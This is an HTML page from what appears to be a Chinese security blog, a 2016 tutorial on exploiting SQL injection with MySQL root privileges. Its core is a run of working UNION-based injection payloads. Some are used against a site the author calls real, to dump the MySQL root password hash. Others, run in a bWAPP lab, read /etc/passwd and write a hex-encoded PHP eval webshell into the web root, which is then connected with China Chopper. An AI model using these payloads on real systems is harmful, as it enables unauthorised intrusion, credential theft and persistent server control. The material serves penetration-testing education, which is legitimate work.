@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="sql注入入门 之 mysql root权限下的注入利用方式"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>sql注入入门 之 mysql root权限下的注入利用方式 - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/05/14/mysql-root-injection/">
+                sql注入入门 之 mysql root权限下的注入利用方式
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-05-14</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/all-sql-injection/">all sql injection</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>1,mysql root权限,实例注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_root1.png" alt="&#39;&#39;"><br></p>
+<p>2,尝试用单引号去干扰vid参数,数据库报错,唉,竟然没顺带一起丢出目标网站的物理路径,差评,嘿嘿……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span><span class="string">'</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_root2.png" alt="&#39;&#39;"><br></p>
+<p>3,尝试闭合<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>   这次看来是个标准的mysql数字型注入了,条件为真时页面返回正常</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_root3.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span> 条件为假时页面返回异常,再次注入点确实存在</div></pre></td></tr></table></figure>
+<p><img src="/img/mysql_root4.png" alt="&#39;&#39;"><br></p>
+<p>4,获取当前表的字段个数,为后面union做准备<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> order by <span class="number">31</span> 个数为<span class="number">31</span>目标页面返回正常</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_root5.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> order by <span class="number">32</span> 个数为<span class="number">32</span>时页面返回错误,可知当前表的字段个数为<span class="number">31</span>个</div></pre></td></tr></table></figure>
+<p><img src="/img/mysql_root6.png" alt="&#39;&#39;"><br></p>
+<p>5,开始执行union爆出对应的数据显示位<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span> %<span class="number">23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_root7.png" alt="&#39;&#39;"><br></p>
+<p>6,搜集数据库信息,如下可知,这是个root权限的注入点,既然是root,那就好办了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,user(),<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,version(),<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,@@basedir,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span> %<span class="number">23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_root8.png" alt="&#39;&#39;"><br></p>
+<p>7,因为是真实站点,我就不瞎动别人东西了,希望大家也养成这样的习惯,不要随意去碰别人的东西,尤其是一些可能存在潜在危险的敏感操作,这里只是单纯查查肯定是没什么问题了,如果是别的就不一定了,(此后的所有的演示说明都是如此,一律点到为止,杜绝’深入探讨’),后面关于读写文件的操作,等会儿都会留在本地做,这里我们就尝试把它的root的密码hash查出来就可以了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,user,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,password,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span> from mysql.user limit <span class="number">0</span>,<span class="number">1</span>  %<span class="number">23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_root8_1.png" alt="&#39;&#39;"><br></p>
+<p>8,最终,得到的root的密码hash如下,如果是实际测试,你还可以顺手telnet下目标的3306,假设目标的mysql能外联,直接用nvaicat连上去操作也许会更方便点<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root : *<span class="number">13</span>A03393631C03176D03A9F5C13CB*******</div></pre></td></tr></table></figure></p>
+<p><br><br><br></p>
+<p>9,这里root权限下的读写操作,就以bwapp中的注入练习为例进行说明了,首先,我们尝试读取目标系统中的/etc/passwd文件,下面的十六进制数据是/etc/passwd hex后的内容<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.47/b</span>WAPP/sqli_2.php?movie=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,load_file(<span class="number">0x2f6574632f706173737764</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> %<span class="number">23</span>&amp;action=go</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_root9.png" alt="&#39;&#39;"><br><br></p>
+<p>10,依然是上面的注入点,这次我们尝试向目标的网站目录中写入php一句话,下面的十六进制数据的明文是&lt;?php @eval($_POST[‘klion’]);?&gt;,后面则是目标网站的物理路径,意思就是把这个一句话写到这个目录中,如下可以看到,提示不能写,原因很明显,因为以你当前的用户身份对这个目录是没有写权限的,如果想写进去,就只能自己动手去把权限放宽一些,因为这里是在本地测试,权限不够,自己给一下就可以了,但实际测试中,如果没权限,那你就只能看看读,如果读也不能读,mysql的root密码hash总也能查出来吧,再或者如果真的是权限被降的一塌糊涂,网站的管理表总归是可以查的吧,按正常的注入把管理员的账号查出来再登到后台传shell也是可以的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.47/b</span>WAPP/sqli_2.php?movie=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">0x3c3f70687020406576616c28245f504f53545b6b6c696f6e5d293f3e</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> into outfile <span class="string">'/var/www/bWAPP/admin/shell.php'</span> %<span class="number">23</span>&amp;action=go</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_root10.png" alt="&#39;&#39;"><br><br></p>
+<p>可以看到,当我们放开权限之后,shell被正常写进去了,虽然报了点警告,但无伤大雅<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.47/b</span>WAPP/sqli_2.php?movie=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">0x3c3f70687020406576616c28245f504f53545b6b6c696f6e5d293f3e</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> into outfile <span class="string">'/var/www/bWAPP/admin/shell.php'</span> %<span class="number">23</span>&amp;action=go</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_root11.png" alt="&#39;&#39;"><br><br></p>
+<p>细心的表哥们可能会看到,这里的一句话掉了个分号,其实,在php中最后一行代码不加分号是可行的<br><img src="/img/mysql_root12.png" alt="&#39;&#39;"></p>
+<p>执行似乎没什么问题,现在尝试用菜刀连一下,脚本正常执行,shell正常连接<br><img src="/img/mysql_root13.png" alt="&#39;&#39;"><br><img src="/img/mysql_root14.png" alt="&#39;&#39;"><br><br></p>
+<p>关于mysql root权限下的权限利用需要注意的一些点:<br><code>(1),正常情况下mysql的root用户确实可以在数据库中为所欲为,但这并不意味着你在目标操作系统中也可以为所欲为,如果启动mysql服务的用户身份只是系统的一个普通用户,那么你在系统中的权限撑死了也就只是个普通用户权限,因为你继承的是那个启动mysql服务的用户权限,说这些只是为了让大家对于mysql root权限下的文件读写利用有个更清晰的认识,大多数时候你会发现,即使你确实是mysql的root用户,但依然没法正常的读写文件,原因就是我上面说的这些,因为你的mysql服务用户只是个普通用户权限,而这个用户对你要操作的那个目录或文件没有读写权限,自然就读写不了,当然,这是基于系统的文件系统权限而言</code><br><code>(2),另外,还有一种情况,假设你对目标的网站目录有正常的读写权限,但是目标在安装完mysql以后对root用户进行了一些权限优化,比如,我想让root只能正常的增删改查,之外的权限全删掉,这时候,你再想进行文件读写,也可能是不行的,因为file权限很可能被干掉了</code><br><code>(3),最后,还可能会有一些别的情况,比如,网站目录被waf或其他的一些防护工具所监控,当你写webshell时,直接就被杀掉或者报警拦截之类的</code><br><code>(4),退一万步来讲,即使你真的没办法读写文件,但这并不妨碍你正常查询数据,拿到网站管理员的账号密码,登到后台传shell也是可以的,不用一条路走到黑,多变通</code><br><code>(5),其实,有时候也可以利用root用户执行系统命令,即udf,有一种提权方法,叫udf提权,利用的就是此特性,还是那句话,即使能执行系统命令,但这并不意味一定可以达到提权(对于linux来讲是直接提到root权限)的效果,关于udf的东西,我们后续再单独说,这里就暂时先放过</code><br><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,就mysql本身的文件读写来讲,非常简单,只是背后的权限映射,需要大家稍微理解下,个人觉得挺好理解的,又没什么拐弯抹角的,都是死东西,相信你只要以前好好琢磨过操作系统的用户组权限,这个对你来说,基本是一点就通,在操作系统中,所有的程序,都是工作在某种安全上下文中的,而这个安全上下文大多数都是由用户来控制和决定的,好吧,稍不留神又TM跑题了,汗……<br><br></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/sqlinjection/">#sqlinjection</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
